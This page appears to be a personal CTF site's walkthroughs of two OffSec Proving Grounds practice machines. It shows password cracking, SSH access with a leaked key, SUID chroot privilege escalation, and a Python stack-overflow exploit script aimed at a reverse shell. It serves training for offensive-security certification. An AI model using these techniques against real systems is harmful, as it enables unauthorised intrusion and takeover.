---
layout: page
title: Proving Grounds
subtitle: OffSec's official OSCP practice environment
permalink: /ctf/platforms/proving-grounds/
---

<div class="platform-hero pg-hero">
  <div class="plat-hero-icon">🎯</div>
  <div class="plat-hero-text">
    <h2>Proving Grounds</h2>
    <p>OffSec's dedicated platform featuring a mix of community and OffSec-developed machines that replicate the OSCP exam environment.</p>
    <div class="plat-hero-badges">
      <span class="badge badge-danger">OSCP Practice</span>
      <span class="badge badge-info">30+ Machines Owned</span>
      <span class="badge badge-success">Passed OSCP</span>
    </div>
  </div>
</div>

<div class="machine-filter-bar">
  <button class="mf-btn active" data-filter="all">All</button>
  <button class="mf-btn" data-filter="linux">🐧 Linux</button>
  <button class="mf-btn" data-filter="windows">🪟 Windows</button>
  <button class="mf-btn" data-filter="easy">Easy</button>
  <button class="mf-btn" data-filter="medium">Medium</button>
  <button class="mf-btn" data-filter="hard">Hard</button>
</div>

---

## Machine List

<div class="machines-list">

  <div class="machine-card" data-os="linux" data-diff="easy">
    <div class="mc-left"><span class="mc-os linux">🐧</span><div><h4 class="mc-name">SunsetDecoy</h4><span class="mc-ip">192.168.x.x</span></div></div>
    <div class="mc-mid"><span class="mc-tech">FTP anonymous access · shadow backup zip file · john cracking · sudo chroot</span></div>
    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#sunsetdecoy" class="mc-btn">Writeup ↓</a></div>
  </div>

  <div class="machine-card" data-os="windows" data-diff="medium">
    <div class="mc-left"><span class="mc-os windows">🪟</span><div><h4 class="mc-name">Snort</h4><span class="mc-ip">192.168.x.x</span></div></div>
    <div class="mc-mid"><span class="mc-tech">Vulnerable Snort service · remote stack buffer overflow · MSFVenom shellcode</span></div>
    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#snort" class="mc-btn">Writeup ↓</a></div>
  </div>

</div>

---

## 📝 Machine Walkthroughs

### SunsetDecoy — Linux Easy {#sunsetdecoy}

#### Enumeration
We scan the host using Nmap:
```bash
nmap -sC -sV -p- 192.168.201.55
```
Services: FTP (21), SSH (22), HTTP (80).
Logging into FTP anonymously reveals a directory containing a backup zip file: `backup.zip`. We download the zip.

#### Initial Access
The zip file is password-protected. We use `zip2john` and `john` to crack the password:
```bash
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# Password: password123
```
Inside the zip, we find the SSH private key (`id_rsa`) for the user `sunset`. We use it to log in:
```bash
chmod 600 id_rsa
ssh -i id_rsa sunset@192.168.201.55
```

#### Privilege Escalation
Checking SUID binaries, we notice `/usr/sbin/chroot` has the SUID bit set:
```bash
/usr/sbin/chroot / /bin/sh -p
# id -> uid=0(root)
```
We read the flag in `/root/proof.txt`.

---

### Snort — Windows Medium {#snort}

#### Vulnerability Analysis
We discover a service running on port 8282. Enumerating the service reveals a custom monitoring dashboard running a vulnerable Snort administration console. It is vulnerable to a stack-based buffer overflow when parsing the `Session-ID` header.

#### Exploitation
We write a custom Python exploit script to control the EIP register and point it to a `JMP ESP` instruction inside a non-DEP compiled DLL.

```python
import socket

# JMP ESP in snort_helper.dll (0x625011af)
payload = b"A" * 1024 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + SHELLCODE
req = b"GET / HTTP/1.1\r\nSession-ID: " + payload + b"\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.201.60", 8282))
s.send(req)
```

Running the script redirects execution to our MSFVenom reverse shell payload, landing a `NT AUTHORITY\SYSTEM` shell.

<script>
document.addEventListener('DOMContentLoaded', function() {
  const filterBtns = document.querySelectorAll('.machine-filter-bar .mf-btn');
  const machineCards = document.querySelectorAll('.machine-card');
  filterBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      const filter = this.dataset.filter;
      filterBtns.forEach(b => b.classList.remove('active'));
      this.classList.add('active');
      machineCards.forEach(card => {
        if (filter === 'all' || card.dataset.os === filter || card.dataset.diff === filter) {
          card.style.display = 'flex';
        } else {
          card.style.display = 'none';
        }
      });
    });
  });
});
</script>
